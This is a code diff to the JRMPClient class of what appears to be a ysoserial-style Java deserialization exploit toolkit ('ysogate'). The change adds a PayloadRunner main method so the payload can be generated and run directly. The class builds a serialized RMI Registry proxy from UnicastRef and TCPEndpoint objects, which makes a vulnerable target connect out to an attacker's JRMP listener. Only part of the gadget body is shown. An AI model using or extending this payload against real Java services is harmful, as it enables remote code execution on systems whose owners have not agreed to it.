@@ -8,6 +8,7 @@ import java.rmi.server.RemoteObjectInvocationHandler;
 import java.util.Random;
 
 import A.R.ysogate.payloads.ObjectPayload;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
@@ -47,7 +48,7 @@ import A.R.ysogate.payloads.annotation.Authors;
 		"restriction"
 })
 @Authors({Authors.MBECHLER})
-public class JRMPClient implements ObjectPayload<Registry> {
+public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
 	public Registry getObject(final String command) throws Exception {
 
@@ -69,5 +70,10 @@ public class JRMPClient implements ObjectPayload<Registry> {
 				Registry.class
 		}, obj);
 		return proxy;
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
+		PayloadRunner.run(JRMPClient.class, args);
 	}
 }
